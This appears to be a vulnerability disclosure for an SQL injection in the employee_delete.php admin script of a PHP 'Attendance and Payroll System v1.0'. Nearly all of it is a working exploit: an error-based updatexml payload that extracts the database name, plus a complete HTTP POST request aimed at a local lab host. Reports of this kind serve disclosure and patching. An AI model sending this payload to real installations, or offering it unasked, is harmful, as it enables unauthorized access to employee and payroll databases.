Attendance and Payroll System v1.0 - SQL injection

Supplier： https://www.sourcecodester.com/php/12268/attendance-and-payroll-system-using-php.html

\admin\employee_delete.php has SQL injection

Payload: id=7' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&delete=

SQL injection because id can be closed

![image](https://user-images.githubusercontent.com/54017627/159218492-e90c3568-0e87-4ca1-b39f-d49871f1fd28.png)

```sql
POST /apsystem/admin/employee_delete.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 73
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/employee.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=7' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&delete=
```

![image](https://user-images.githubusercontent.com/54017627/159218815-1a8d1f24-e6e5-470f-bc9a-b5fc467ce110.png)

![image](https://user-images.githubusercontent.com/54017627/159218897-0200ec17-f2a2-41d4-9dd8-53d49102d1a7.png)
